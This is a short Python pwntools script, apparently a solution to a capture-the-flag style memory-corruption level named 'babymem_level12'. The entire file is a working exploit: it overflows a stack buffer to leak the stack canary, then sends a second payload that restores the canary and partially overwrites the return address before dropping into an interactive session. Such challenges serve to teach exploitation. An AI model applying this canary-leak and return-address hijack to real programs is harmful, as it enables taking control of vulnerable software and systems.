#!/usr/bin/env python3

from pwn import *

# Create a process
p = process('/babymem_level12_testing1')

# Send payload size
p.sendline(b"121")

# Send payload
p.send(b"REPEAT" + b"a" * 115)

# Retrieve stack canary
stack_canary = int.from_bytes(p.recvline_startswith(b"You said: ")[131:138], "little")
print(hex(stack_canary))

# Re-enter function again
# Send payload size
p.sendline(b"138")

# Send payload
p.send(b"a" * 120 + p64(stack_canary * 256) + b"a" * 8 + p16(0x14eb))
p.interactive()
